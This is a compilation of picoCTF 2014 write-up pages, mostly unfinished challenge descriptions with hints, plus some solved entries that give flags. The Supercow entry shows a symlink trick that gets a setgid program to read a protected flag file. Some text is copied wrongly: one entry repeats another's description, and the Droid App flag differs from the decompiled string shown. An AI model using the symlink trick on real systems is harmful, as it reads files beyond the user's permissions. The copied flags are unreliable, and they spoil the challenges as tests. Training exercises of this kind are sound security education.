* <https://ctf-team.vulnhub.com/picoctf-2014-executeme/>
# Pico CTF 2014 : Format

**Category:** Binary Exploitation
**Points:** 70
**Description:**

>This program is vulnerable to a format string attack! See if you can modify a variable by supplying a format string! The binary can be found at /home/format/ on the shell server. The source can be found here.

**Hint:**
>There is already a pointer to the variable on the stack! Also, %n may be useful!

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/binary_exploitation/format.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-format/>
* <https://github.com/PizzaEaters/picoCTF-2014/tree/master/format>
# Pico CTF 2014 : Guess

**Category:** Binary Exploitation
**Points:** 75
**Description:**

>This program requires you to guess a random 32-bit number! Sounds difficult, right? There is a server running at vuln2014.picoctf.com:4546, and the source can be found [here](guess.c).

**Hint:**
>The only way to combat secure randomness is to leak the secret.

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/binary_exploitation/guess.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-guess/>
# Pico CTF 2014 : Never note

**Category:** Binary Exploitation
**Points:** 180
**Description:**

>In light of the recent attacks on their machines, Daedalus Corp has implemented a buffer overflow detection library. Nevernote, a program made for Daedalus Corps employees to take notes, uses this library.
Can you bypass their protection and read the secret? The binary can be found at /home/nevernote/ on the shell server.

The source can be downloaded here.

**Hint:**
>Think about what fields of the canary struct you control. Also, malloc() is predictable without ASLR.

## Write-up

(TODO)

## Other write-ups and resources

* <http://cregnec.github.io/blog/2014/11/17/picoctf-2014-writeup.html#nevernote>
* <https://ctf-team.vulnhub.com/picoctf-2014-nevernote/>
* <https://github.com/PizzaEaters/picoCTF-2014/tree/master/nevernote>
* <http://barrebas.github.io/blog/2014/11/06/picoctf-write-ups/>
# Pico CTF 2014 : No Overflow

**Category:** Binary Exploitation
**Points:** 140
**Description:**

>This tries to prevent a buffer overflow by asking you how long your input is! Exploit it anyways! The binary can be found at /home/no_overflow/ on the shell server. The source can be found [here](no_overflow.c).

**Hint:**
>Are there any numbers that are less than 256 and bigger than 256 depending on how you look at it?

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/picoctf-2014-no-overflow/>
* <https://github.com/PizzaEaters/picoCTF-2014/tree/master/no_overflow>
* <http://barrebas.github.io/blog/2014/11/06/picoctf-write-ups/>
# Pico CTF 2014 : Overflow 1

**Category:** Binary Exploitation
**Points:** 50
**Description:**

>This problem has a buffer overflow vulnerability! Can you get a shell, then use that shell to read flag.txt? You can solve this problem interactively [here](https://picoctf.com/problem-static/binary/Overflow1/overflow1.html#1), and the source can be found [here](oveflow1.c).

**Hint:**
>Can you overflow into the 'secret' variable?

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/binary_exploitation/overflow1.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-overflow1/>
# Pico CTF 2014 : Overflow 2

**Category:** Binary Exploitation
**Points:** 70
**Description:**

>This problem has a buffer overflow vulnerability! Can you get a shell? You can solve this problem interactively [here](https://picoctf.com/problem-static/binary/Overflow2/overflow2.html), and the source can be found here(overflow2.c).

**Hint:**
>How can you run the give_shell function?

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/binary_exploitation/overflow_2.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-overflow-2/>
# Pico CTF 2014 : ROP 1

**Category:** Binary Exploitation
**Points:** 100
**Description:**

>This binary is running on a machine with ASLR! Can you bypass it? The binary can be found at /home/rop1/ on the shell server. The source can be found [here](rop1.c).

**Hint:**
>ASLR is hard to beat if you need to predict an address, but what if you don't? What does %eax contain when vuln returns? Is there any code in the program which calls or jumps to it?

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/binary_exploitation/rop_1.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-rop1/>
* <https://github.com/PizzaEaters/picoCTF-2014/tree/master/rop1>
# Pico CTF 2014 : This is the Endian

**Category:** Binary Exploitation
**Points:** 40
**Description:**

>This is the end! Solving this challenge will help you defeat Daedalus's cyborg. You can find more information about endianness and the problem [here](https://picoctf.com/problem-static/binary/this-is-the-endian/endian.html#1). The flag is the smallest possible program input that causes the program to print "Access Granted".

**Hint:**
>Integers are 4 bytes (characters) long.

## Write-up
Looking through the source code we can see that the program looks for the first four chars of the access code to be hex 0x52657663 and the 2nd four chars to be 0x30646521. Unfortunately when we translate those two halfs to ASCII and put them together it is not accpeted as the answer. This means that the system is a little endian system. Flipping 0x52657663 to 0x63766552 and 0x030646521 to 0x21656430 gives us the answer.

## Answer
cveR!ed0

## Other write-ups and resources

* none yet
# Pico CTF 2014 : What the Flag

**Category:** Binary Exploitation
**Points:** 140
**Description:**

>This binary uses stack cookies to prevent exploitation, but all hope is not lost. Read the flag from flag.txt anyways! The binary can be found at /home/what_the_flag/ on the shell server. You can solve this problem interactively [here](https://picoctf.com/problem-static/binary/WhatTheFlag/what_the_flag.html
). The source can be found [here](what_the_flag.c).

**Hint:**
>How can you enter a correct password, but still overflow the buffer? Think about what terminates gets(). Also, the file name that you want to open is already in the binary!

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/picoctf-2014-what-the-flag/>
# Pico CTF 2014 : Write Right

**Category:** Binary Exploitation
**Points:** 50
**Description:**

>Can you change the secret? The binary can be found at /home/write_right/ on the shell server. The source can be found [here](write_right.c).

**Hint:**
>You will want to find the memory address of the secret.

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/picoctf-2014-write_right/>
# Pico CTF 2014 : Block

**Category:** Crypto
**Points:** 130
**Description:**

>Daedalus Corp has been using this script to encrypt it's data! We think this file contains a password to their command server. Can you crack it?
[block.py](block.py)
[encrypted](encrypted)

**Hint:**
>Is double encryption twice as secure?

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/cryptography/block.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-block/>
# Pico CTF 2014 : Caesar

**Category:** Crypto
**Points:** 20
**Description:**

>You find an encrypted message written on the documents. Can you decrypt it?

**Hint:**
>Is there a cipher named the same as the title of this problem?

## Write-up

We rotate the text using the caesar cipher using [this tool]():

```bash
$ for i in {0..25}; do python rot.py -l $i espdpncpealddascldptdfvaaychcjplgrehtnqxycvmykpblhr; done
espdpncpealddascldptdfvaaychcjplgrehtnqxycvmykpblhr
ftqeqodqfbmeebtdmequegwbbzdidkqmhsfiuoryzdwnzlqcmis
[...]
sgdrdbqdsozrrogqzrdhrtjoomqvqxdzufsvhbelmqjamydpzvf
thesecretpassphraseisukppnrwryeavgtwicfmnrkbnzeqawg
uiftfdsfuqbttqisbtfjtvlqqosxszfbwhuxjdgnoslcoafrbxh
[...]
```

The flag is `ukppnrwryeavgtwicfmnrkbnzeqawg`.

## Other write-ups and resources

* <http://ehsandev.com/pico2014/cryptography/caesar.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-ceasar/>
# Pico CTF 2014 : ECC

**Category:** Crypto
**Points:** 100
**Description:**

>We found a weird piece of paper with this written on it. I can't make heads or tails of it, but it seems to be talking about an encoded message. Can you get the message for us?

**Hint:**
>Use a computer algebra system with builtin support for elliptic curves, such as Sage. This elliptic curve is defined over the group of integers Z/nZ (Zmod(n) in Sage) and is in Weierstrass form (a1 = a2 = a3 = 0).

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/cryptography/ecc.html>
# Pico CTF 2014 : Low Entropy

**Category:** Crypto
**Points:** 110
**Description:**

>Daedalus Corp's spy in Thyrin Labs seems to sometimes use an encrypted drop box for their messages. We intercepted one of their messages, but we don't seem to be able to decrypt it. Fortunately, we have the source and the address of their key generation server: maybe there's a way to use that to decrypt their message? Unfortunately, we don't have their list of cached primes...
Their source, and our intercepted message, are here. The key generation service is running at [vuln2014.picoctf.com:51818](http://vuln2014.picoctf.com:51818).

**Hint:**
>We're pretty sure that 30 total possible primes is low enough that we should be able to correlate different keys somehow...

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/cryptography/low_entropy.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-low-entropy/>
* <http://barrebas.github.io/blog/2014/11/06/picoctf-write-ups/>
# Pico CTF 2014 : Repeated XOR

**Category:** Crypto
**Points:** 70
**Description:**

>There's a secret passcode hidden in the robot's "history of cryptography" module. But it's encrypted! Here it is, hex-encoded: [encrypted.txt](encrypted.txt). Can you find the hidden passcode?

**Hint:**
>Like the title suggests, this is repeating-key XOR. You should try to find the length of the key - it's probably around 10 bytes long, maybe a little less or a little more.

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/cryptography/repeated_xor.html>
# Pico CTF 2014 : Revenge of the Bleichenbacher

**Category:** Crypto
**Points:** 170
**Description:**

>We found a Daedalus Corp command server, that lets people read some shared files. But it requires cryptographically signed commands! Can you forge a signature for us? It's running at vuln2014.picoctf.com. The JAR file for the service is here.

**Hint:**
>The service's signature checks are incomplete: can you figure out a way to put in some garbage? In particular, we think it may be vulnerable to a similar bug that Mozilla's NSS library was recently: see here.

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/cryptography/revenge.html>
# Pico CTF 2014 : RSA

**Category:** Crypto
**Points:** 80
**Description:**

>A Daedalus Corp spy sent an RSA-encrypted message. We got their key data, but we're not very good at math. Can you decrypt it? Here's the data. Note that the flag is not a number but a number decoded as ASCII text.

**Hint:**
>This is just plain old RSA decryption.

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/cryptography/rsa.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-rsa/>
# Pico CTF 2014 : Substitution

**Category:** Crypto
**Points:** 50
**Description:**

>There's an authorization code for some Thyrin Labs information here, along with someone's favorite song. But it's been encrypted! Find the authorization code.
[encrypted.txt](encrypted.txt)

**Hint:**
>You may want to look at what the relative frequencies of letters in english text are.

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/cryptography/substitution.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-substitution/>
# Pico CTF 2014 : The Valley Of Fear

**Category:** Crypto
**Points:** 20
**Description:**

>The hard drive may be corrupted, but you were able to recover a small chunk of text. Scribbled on the back of the hard drive is a set of mysterious numbers. Can you discover the meaning behind these numbers? (1, 9, 4) (4, 2, 8) (4, 8, 3) (7, 1, 5) (8, 10, 1)

**Hint:**
>Might each set of three numbers represent a word in a message?

## Write-up

The hint tells us that each of these three numbers might represent a word in a message.

We are given 9 paragraphs in [book.txt]() with up to 17 lines for each sentence and quickly discover that each triple uses following scheme to encodes/hide a word:

```
(1, 9, 4) === (paragraph, line-in-paragraph, word-in-line) === 4th word in 9th line of first paragraph
```

That means we get following words:

```
(1,  9, 4) === the
(4,  2, 8) === flag
(4,  8, 3) === is
(7,  1, 5) === Ceremonial
(8, 10, 1) === plates
```

The flag is `Ceremonial plates`.

## Other write-ups and resources

* <http://ehsandev.com/pico2014/cryptography/the_valley_of_fear.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-the-valley-of-fear/>
* <https://github.com/PizzaEaters/picoCTF-2014/tree/master/valley>
# Pico CTF 2014 : Web Instresption

**Category:** Crypto
**Points:** 140
**Description:**

>We were able to get some code running in a Daedalus browser. Unfortunately we can't quite get it to send us a cookie for its internal login page ourselves... But we can make it make requests that we can see, and it seems to be encrypting using ECB mode. See here for more details about what we can get. It's running at [vuln2014.picoctf.com:65414](http://vuln2014.picoctf.com:65414). Can you get us the cookie?

**Hint:**
>In ECB mode, the same plaintext block appearing in two different places leads to the same ciphertext block appearing in both places. Can you figure out how to use this, and the encryption oracle that you have, to decrypt the cookies one byte at a time?

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/cryptography/web_interception.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-web-interception/>
* <http://barrebas.github.io/blog/2014/11/06/picoctf-write-ups/>
# Pico CTF 2014 : XOR

**Category:** Crypto
**Points:** 50
**Description:**

>Daedalus has encrypted their blueprints! Can you get us the password?
[ZOR.py](ZOR.py)
[encrypted](encrypted)

**Hint:**
>The password gets reduced to a one byte XOR key. That's only 256 possible keys!

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/cryptography/zor.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-zor/>
# Pico CTF 2014 : Droid App

**Category:** Forensics
**Points:** 80
**Description:**

>An Android application was released for the toaster bots, but it seems like this one is some sort of debug version. Can you discover the presence of any debug information being stored, so we can plug this?
You can download the apk here.

**Hint:**
>Android apk files are notoriously easy to decompile. We heard there are even online services that does this automatically nowadays.

## Write-up

We decompile the apk using [jadx](https://github.com/skylot/jadx) and recursively `grep` the output to find any debug information:

```
$ jadx -x ToasterBot.apk 
INFO  - output directory: ToasterBot
INFO  - loading ...
WARN  - Indent < 0
[...]
$ grep debug -ir .
1∣09ː07∣droid-app-80▶ grep debug -ri ToasterBot
ToasterBot/android/support/v4/app/BackStackRecord.java:            if (FragmentManagerImpl.DEBUG) {
ToasterBot/android/support/v4/app/BackStackRecord.java:                    if (FragmentManagerImpl.DEBUG) {
[...]
ToasterBot/android/support/v7/internal/widget/ListPopupWindow.java:        int maxHeight = getMaxAvailableHeight(getAnchorView(), this.mDropDownVerticalOffset, this.mPopup.getInputMethodMode() == 2 ? true : DEBUG);
ToasterBot/picoapp453/picoctf/com/picoapp/BuildConfig.java:    public static final boolean DEBUG = false;
ToasterBot/picoapp453/picoctf/com/picoapp/ToasterActivity.java:        Log.d("Debug tag", this.mystery);
```

The last `Log` function call seems promising, lets try to find mystery:

```bash
$ grep mystery -ri ToasterBot
ToasterBot/picoapp453/picoctf/com/picoapp/ToasterActivity.java:    String mystery;
ToasterBot/picoapp453/picoctf/com/picoapp/ToasterActivity.java:        this.mystery = new String(new char[]{'f', 'l', 'a', 'g', ' ', 'i', 's', ':', ' ', 'w', 'h', 'a', 't', '_', 'd', 'o', 'e', 's', '_', 't', 'h', 'e', '_', 'l', 'o', 'g', 'c', 'a', 't', '_', 's', 'a', 'y'});
ToasterBot/picoapp453/picoctf/com/picoapp/ToasterActivity.java:        Log.d("Debug tag", this.mystery);
```

The flag is `what_does_the_logchat_say`.

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/picoctf-2014-droidapp/>
# Pico CTF 2014 : Grep is still your friend

**Category:** Forensics
**Points:** 40
**Description:**

>The police need help decrypting one of your father's files. Fortunately you know where he wrote down all his backup decryption keys as a backup (probably not the best security practice). You are looking for the key corresponding to daedaluscorp.txt.enc. The file is stored on the shell server at /problems/grepfriend/keys .

**Hint:**
>[Grep](http://www.uccs.edu/~ahitchco/grep/) is your friend!

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/picoctf-2014-grep-is-still-your-friend/>
# Pico CTF 2014 : Intercepted Post

**Category:** Forensics
**Points:** 40
**Description:**

>We intercepted some of your Dad's web activity. Can you get a password from his traffic?. You can also view the traffic on CloudShark.

**Hint:**
>Login is usually done through a POST request. Then, depending on what characters are in Claudio's password, they may be specially encoded...

## Write-up

Opening the pcap traffic dump with `wireshark`, we look for a HTTP `POST` and find it in the last section of the intercepted packages:

![](password.png)

The flag is `flag{pl$_$$l_y0ur_l0g1n_form$}`.

## Other write-ups and resources

* <http://ehsandev.com/pico2014/forensics/intercepted_post.html>
# Pico CTF 2014 : Pickle Jar

**Category:** Forensics
**Points:** 30
**Description:**

>The police station offers free pickles to police officers. However, someone stole the pickles from the pickle jar! You find a clue[file] on a USB drive left at the scene of the crime.

**Hint:**
>What exactly is a [JAR file](http://en.wikipedia.org/wiki/JAR_%28file_format%29)?

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/picoctf-2014-pickle-jar/>
# Pico CTF 2014 : PNG or NOT

**Category:** Forensics
**Points:** 100
**Description:**

>On a corner of the bookshelf, you find a small CD with an image file on it. It seems that this file is more than it appears, and some data has been hidden within. Can you find the hidden data?

**Hint:**
>The PNG file format has a marker for the end of the image.

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/forensics/png_or_not.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-png-or-not/>
# Pico CTF 2014 : Redacted

**Category:** Forensics
**Points:** 50
**Description:**

>You found a [letter](Redacted.pdf) that may shed light on recent events

**Hint:**
>That "super secret access code" looks interesting. I wonder if the info behind the black boxes is really gone for good?

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/picoctf-2014-redacted/>
# Pico CTF 2014 : Snapchat

**Category:** Forensics
**Points:** 80
**Description:**

>It was found that a Daedalus employee was storing his personal files on a work computer. Unfortunately, he corrupted the filesystem before we could prove it. Can you take a look? Download here.

**Hint:**
>It seems like data recovery can be performed on the disk.img--maybe you'll find something?

## Write-up

We can start by trying `strings` on the file to see what it outputs

```
$ strings disk.img
PICTURES   
driEEEE
ziEE
.          
dniEEEE
niEE
..         
dniEEEE
niEE
BILLY   JPG 
driEEEE
riEE
LAG    JPG 
driEEEE
riEE1
FUZZY   JPG 
driEEEE
riEE8
PEW     JPG 
driEEEE
riEE
PRECIOUSJPG 
driEEEE
riEE
JFIF
<............ more random data........>
```

The image seems to contain some pictures apparently. We can try to recover them with `foremost`

```
$ foremost -v disk.img                                                                                                                                                                                    [master] 
Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus
Audit File

Foremost started
Invocation: foremost -v disk.img 
Output directory: output/
Configuration file: /etc/foremost.conf
Processing: disk.img
|------------------------------------------------------------------
File: disk.img
Length: 5 MB (5242880 bytes)
 
Num  Name (bs=512)         Size  File Offset     Comment 

0:  00000057.jpg          89 KB           29184      
1:  00000237.jpg          13 KB          121344      
2:  00000265.jpg         172 KB          135680      
3:  00000613.jpg          34 KB          313856      
4:  00000685.jpg          56 KB          350720      
*|
Finish: Sat Mar 12 13:48:30 2016

5 FILES EXTRACTED
    
jpg:= 5
------------------------------------------------------------------

Foremost finished
```

We check the images in the output directory and one of them displays the flag 
`i_can_has_cheezburger`

## Other write-ups and resources

* <http://ehsandev.com/pico2014/forensics/snapcat.html>
# Pico CTF 2014 : Spoof Proof

**Category:** Forensics
**Points:** 60
**Description:**

>The police have retrieved a network trace of some suspicious activity. Most of the traffic is users viewing their own profiles on a social networking website, but one of the users on the network downloaded a file from the Thyrin Labs VPN and spoofed their IP address in order to hide their identity. Can you figure out the last name of person that accessed the Thyrin files, and the two source IP addresses they used?
[Example valid flag format: "davis,192.168.50.6,192.168.50.7"].
PCAP file available [here](traffic.pcap). You can also view it on [CloudShark](https://www.cloudshark.org/captures/44e55fba6c1b)

**Hint:**
>The IP address was changed, but what about the [MAC Address](http://www.differencebetween.net/technology/difference-between-mac-and-ip-address/)?

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/picoctf-2014-spoof-proof/>
# Pico CTF 2014 : SSH Backdoor

**Category:** Forensics
**Points:** 100
**Description:**

>Some hackers have broken into my server backdoor.picoctf.com and locked my user out (my username is jon). I need to retrieve the flag.txt file from my home directory.
The last thing we noticed in out network logs show is the attacker downloading this. Can you figure out a way to get back into my account?

**Hint:**
>The attackers left a backdoor in the openssh server. Maybe you could compare it to the real code?

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/forensics/ssh_backdoor.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-ssh-backdoor/>
# Pico CTF 2014 : Supercow

**Category:** Forensics
**Points:** 40
**Description:**

>Daedalus Corp. has a special utility for printing .cow files at /home/daedalus/supercow. Can you figure out how to get it to print out the flag?

**Hint:**
>Read up on [symlinks](http://en.wikipedia.org/wiki/Symbolic_link) in Linux.

## Write-up

We login to the [Shell](https://picoctf.com/shell) and checkout the directory in question:

```
shell:/home/daedalus$ ls -la
total 36
drwxr-xr-x  2 root root     4096 Jul  6  2015 .
drwxr-xr-x 19 root root     4096 Jul  6  2015 ..
-r--r-----  1 root daedalus   26 Jul  6  2015 flag.txt
-r--r-----  1 root daedalus   15 Jul  6  2015 hint.cow
-r--r-----  1 root daedalus   11 Jul  6  2015 secret1.cow
-r--r-----  1 root daedalus   11 Jul  6  2015 secret2.cow
-rwxr-sr-x  1 root daedalus 7639 Jul  6  2015 supercow
-rw-r--r--  1 root root     1723 Jul  6  2015 supercow.c
```

Let's try supercow with the files in the dir:

```
@shell:/home/daedalus$ ./supercow secret1.cow
 ____________
< cow_text_1 >
 ------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
@shell:/home/daedalus$ ./supercow secret2.cow
 ____________
< cow_text_2 >
 ------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
@shell:/home/daedalus$ ./supercow hint.cow
 ________________
< perhaps_a_hint >
 ----------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
@shell:/home/daedalus$ ./supercow flag.txt
Filename must end in .cow
```

And let's also check out supercow.c

```
@shell:/home/daedalus$ cat supercow.c
/*
 * The below isn't critical to solving the problem, but read on if
 * you're interested!
 *
 * You might be wondering - why is it that the supercow program is able
 * to read the /home/problemuser/secret1.cow file, but trying to read it
 * with:
 *
 * cat /home/problemuser/secret1.cow
 *
 * gives a permission denied error?
 *
 * supercow is a setgid program. This means that when you run supercow,
 * it runs with the privileges of problemuser instead of your user. That
 * is why the supercow program can access /home/problemuser/secret1.cow
 * (and potentially /home/problemuser/flag), even though it is not
 * readable by your normal user.
 *
 * $ ls -l supercow
 * -rwsr-xr-x 1 problemuser root [size in bytes] [last modified time] supercow
 *    ^ this s signifies that supercow is setgid. This means that
 *      supercow runs with the privileges of its owner user, which is
 *      problemuser.
 *
 * For more information about how this works, see
 * http://en.wikipedia.org/wiki/Setuid, or feel free to ask an organizer
 * :-)
 */
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

int main(int argc, char **argv) {
  if (argc < 2) {
    printf("Usage: super_cow [cow_file]\n");
    return 1;
  }

  char *file = argv[1];
  char *ext = strrchr(file, '.');
  if (ext == NULL || strcmp(ext, ".cow") != 0) {
    printf("Filename must end in .cow\n");
    return 1;
  }

  int fd = open(file, O_RDONLY);
  if (fd == -1) {
    perror("open");
    return 1;
  }

  dup2(fd, 0);

  gid_t gid = getegid();
  setregid(gid, gid);

  char *arg[] = { "/usr/games/cowsay", NULL };
  char *env[] = { NULL };
  execve(arg[0], arg, env);
  return 1;
}
```

We observe that the C code checks if the file's extension is .cow and only then passes it on as an argument to our setgid cowsay. Since the supercow binary has the setgid bit on it is executed as its group user instead of our own user. So if we manage to pass the flag.txt to the binary and pass the check for the extension we should be able to read the flag with the permissions from group daedalus.
The hint suggests using symlinks since we don't have any other (simple) way to read/copy the file or alter it's permissions or owner/group.

We can do:

```
ln -siv /home/daedalus/flag.txt ~/flag.cow
```

The supercow binary will then pass the extension check since our symlink ends in .cow and it will read the actual flag since the open() call will follow the symlink.

```
@shell:/home/daedalus$ ./supercow ~/flag.cow
 ___________________________
< cows_drive_mooooving_vans >
 ---------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

**cows_drive_mooooving_vans** is our flag.

## Other write-ups and resources

* none yet
# Pico CTF 2014 : Baleful

**Category:** Master Challenge
**Points:** 200
**Description:**

>This program seems to be rather delightfully twisted! Can you get it to accept a password? We need it to get access to some Daedalus Corp files.

**Hint:**
>This program appears to be "packed." Fortunately, it's packed with a common packer, and no trickery was performed - so you should be able to just unpack it with the same packer.

## Write-up

(TODO)

## Other write-ups and resources

* <http://cregnec.github.io/blog/2014/11/17/picoctf-2014-writeup.html#baleful>
* <https://ctf-team.vulnhub.com/picoctf-2014-baleful/>
# Pico CTF 2014 : Fancy Cache

**Category:** Master Challenge
**Points:** 200
**Description:**

>Margaret wrote a fancy in-memory cache server. For extra security, she made a custom string structure that keeps strings on the heap. However, it looks like she was a little sloppy with her mallocs and frees. Can you find and exploit a bug to get a shell?

>You can connect to the server at [vuln2014.picoctf.com:4548](http://vuln2014.picoctf.com:4548)

>The following exploit mitigations are enabled on the server:

>ASLR: This means the stack, heap, and libc addresses are randomized. However, the locations of code and data inside the binary is not randomized.

>NX: No memory is every simultaneously writable and executable. This means that you cannot just write shellcode somewhere and get the program to jump to it.

>Here's the info (don't worry about the libc file for now): source code, binary, libc

>P.S. We found a client for the server: client.py

**Hint:**
>Is there any way that the server might try to use a struct string after it has been freed? Perhaps we can put something else in the freed memory. For similarly sized allocations, malloc often returns a recently freed address.

>The offset of memcmp in libc is 0x142870. This is different than what objdump says because libc chooses a different memcmp implementaton depending on what features the processor supports.

## Write-up

(TODO)

## Other write-ups and resources

* <http://cregnec.github.io/blog/2014/11/17/picoctf-2014-writeup.html#fancy-cache>
* <https://ctf-team.vulnhub.com/picoctf-2014-fancy-cache/>
* <http://barrebas.github.io/blog/2014/11/06/picoctf-fancy-cache/>
# Pico CTF 2014 : Hardcore ROP

**Category:** Master Challenge
**Points:** 200
**Description:**

>This program is obviously broken, but thanks to ASLR, PIE, and NX it's still pretty secure! Right?
NB: This problem is running in a slightly unusual setup to get extra PIE randomness. If you have an exploit that works 100% reliably locally (outside of GDB, which often disables any randomness), but you can't get it to land on our server, feel free to message us for help. [Source](hardcore_rop.c) [Binary](hardcore_rop)

>nc vuln2014.picoctf.com 4000

**Hint:**
>This is a statically linked binary (using musl libc). There is no full libc available for you to return into, but if you can leak a .text section address you can return into main(), randop(), and the chunks of libc that are included. Also, you'll probably need to hunt for ROP gadgets: here is a nice tool for that.

>[shell-storm.org](http://shell-storm.org/project/ROPgadget/)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/picoctf-2014-hardcore-rop/>
* <https://github.com/PizzaEaters/picoCTF-2014/tree/master/hardcore_rop>
* <http://barrebas.github.io/blog/2014/11/06/picoctf-hardcore-rop/>
* <https://www.whitehatters.academy/picoctf-hardcore-rop/>
# Pico CTF 2014 : RSA Mistakes

**Category:** Master Challenge
**Points:** 200
**Description:**

>Daedalus Corp seems to have had a very weird way of broadcasting some secret data. We managed to find the server code that broadcasted it, and one of our routers caught some of their traffic - can you find the secret data? We think someone may have requested the secret using someone else's user id by accident, but we're not sure.

**Hint:**
>Two of these messages use the same public key, and are related in a useful way.

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/cryptography/RSAMistake.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-rsa-mistakes/>
# Pico CTF 2014 : Steves List 

**Category:** Master Challenge
**Points:** 200
**Description:**

>This program is obviously broken, but thanks to ASLR, PIE, and NX it's still pretty secure! Right?
NB: This problem is running in a slightly unusual setup to get extra PIE randomness. If you have an exploit that works 100% reliably locally (outside of GDB, which often disables any randomness), but you can't get it to land on our server, feel free to message us for help. [Source](hardcore_rop.c) [Binary](hardcore_rop)

>nc vuln2014.picoctf.com 4000

**Hint:**
>This is a statically linked binary (using musl libc). There is no full libc available for you to return into, but if you can leak a .text section address you can return into main(), randop(), and the chunks of libc that are included. Also, you'll probably need to hunt for ROP gadgets: here is a nice tool for that.

>[shell-storm.org](http://shell-storm.org/project/ROPgadget/)

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/web_exploitation/steves_list.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-steves-list/>
# Pico CTF 2014 : Common Vulnerability Exercise

**Category:** Miscellaneous
**Points:** 20
**Description:**

>This disc is encrypted. The surprisingly elaborate password hint refers to "the [CVE Identifier](http://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures) for a 2014 vulnerability that allowed arbitrary code execution in Firefox via a buffer overflow in a speech codec". If you found this "CVE-ID" thingy, it'd probably be the password.

**Hint:**
>You can search CVEs at [Mitre](https://cve.mitre.org/cve/cve.html). Google is pretty good at searching things too ;)

## Write-up

(TODO)

## Other write-ups and resources

* <https://picoctf.wordpress.com/2014/11/10/common-vulnerability-exercise-20-picoctf-writeup-2014/> 
* <https://ctf-team.vulnhub.com/picoctf-2014-common-vulnerability-exercise/>
# Pico CTF 2014 : OBO

**Category:** Miscellaneous
**Points:** 90
**Description:**

>This password changing program was written by an inexperienced C programmer. Can you some find bugs and exploit them to get the flag? The problem can be found at /home/obo/ on the shell server, and the source code can be downloaded here

**Hint:**
>Can you figure out the error the programmer mentioned in the comments?

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/binary_exploitation/OBO.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-obo/>
# Pico CTF 2014 : Robo Photo

**Category:** Miscellaneous
**Points:** 30
**Description:**

>Your father has been known to use the titles of his favorite books as passwords. While you don't remember any of the names of the books, your father keeps a poster for one of them on his wall. Can you figure out the name of the book and unlock the CD?

**Hint:**
>Google is once again your friend.

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/picoctf-2014-robophoto/>
# Pico CTF 2014 : Tyrannousaurus Hex

**Category:** Miscellaneous
**Points:** 10
**Description:**

>The contents of the flash drive appear to be password protected. On the back of the flash drive, you see the hexadecimal number 0x95f48ed9 scribbled in ink. The password prompt, however, only accepts decimal numbers. What number should you enter? (Press the Hint button for advice on solving the challenge)

**Hint:**
>You could try asking [Google](https://www.google.com/) or [Wolfram Alpha](http://www.wolframalpha.com/).

## Write-up

We have to convert the hexadecimal number `0x95f48ed9` to decimal and can do that by using `printf`:

```bash
$ printf "%d\n" 0x95f48ed9
2515832537
```

The flag is `2515832537`.

## Other write-ups and resources

* <https://picoctf.wordpress.com/2014/11/10/tyrannosaurus-hex-10-picoctf-2014-writeup/>
